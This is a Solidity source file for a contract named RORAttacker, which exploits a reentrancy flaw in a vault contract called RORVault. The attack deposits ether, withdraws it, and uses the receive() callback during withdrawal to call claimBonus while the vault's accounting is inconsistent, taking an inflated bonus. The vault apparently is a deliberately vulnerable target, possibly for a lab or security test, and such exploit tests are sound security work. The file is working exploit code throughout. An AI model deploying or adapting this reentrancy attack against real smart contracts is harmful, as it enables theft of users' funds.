// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IRORVault {
    function deposit() external payable;
    function withdraw(uint256 shares) external;
    function claimBonus() external;
}

/// RORAttacker — exploits RORVault's CEI violation. attack(vault) deposits,
/// withdraws; receive() inside withdraw's transfer calls claimBonus while
/// totalShares < totalAssets, capturing the inflated bonus.
contract RORAttacker {
    address public vault;
    bool public claimed;

    function attack(address _vault) external payable {
        vault = _vault;
        claimed = false;
        IRORVault(_vault).deposit{value: msg.value}();
        IRORVault(_vault).withdraw(msg.value);
    }

    receive() external payable {
        // Only fire claimBonus on the FIRST callback (the one from
        // withdraw's transfer). Subsequent calls to receive (from
        // claimBonus's own transfer to us) must not recurse, else the
        // outer withdraw OOGs and reverts.
        if (vault != address(0) && msg.sender == vault && !claimed) {
            claimed = true;
            IRORVault(vault).claimBonus();
        }
    }
}
